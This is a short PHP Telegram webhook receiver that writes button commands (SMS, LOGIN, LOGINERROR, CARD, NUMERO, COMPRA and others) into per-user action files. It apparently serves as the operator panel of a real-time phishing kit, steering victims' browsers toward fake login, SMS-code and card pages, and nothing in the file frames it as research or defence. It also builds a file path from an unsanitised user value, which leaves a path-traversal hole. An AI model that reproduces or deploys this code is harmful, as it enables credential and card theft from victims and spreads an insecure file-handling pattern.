<?php
// ===== bot.php — Webhook receiver de Telegram =====
include("settings.php");

// Verificar que el request viene de Telegram
$secret_header = $_SERVER['HTTP_X_TELEGRAM_BOT_API_SECRET_TOKEN'] ?? '';
if ($secret_header !== $webhook_secret) {
    http_response_code(403);
    exit('Forbidden');
}

$update = json_decode(file_get_contents("php://input"), true);

if (isset($update['callback_query'])) {
    $cb_id   = $update['callback_query']['id'];
    $data    = $update['callback_query']['data']; // Ej: "SMS|usuario123"

    if (strpos($data, '|') !== false) {
        list($comando, $usuario) = explode('|', $data, 2);

        if (!file_exists("acciones")) mkdir("acciones", 0755, true);

        $archivo = "acciones/$usuario.txt";

        $map = [
            'SMS'        => '/SMS',
            'SMSERROR'   => '/SMSERROR',
            'NUMERO'     => '/NUMERO',
            'ERROR'      => '/ERROR',
            'LOGIN'      => '/LOGIN',
            'LOGINERROR' => '/LOGINERROR',
            'CARD'       => '/CARD',
            'LISTO'      => '/LISTO',
            'MAIL'       => '/MAIL',
            'COMPRA'     => '/COMPRA',
        ];
        file_put_contents($archivo, $map[$comando] ?? '/ERROR');

        tg_request('answerCallbackQuery', [
            'callback_query_id' => $cb_id,
            'text'              => "✅ $comando → $usuario",
            'show_alert'        => false,
        ]);
    }
}

http_response_code(200);
echo 'OK';
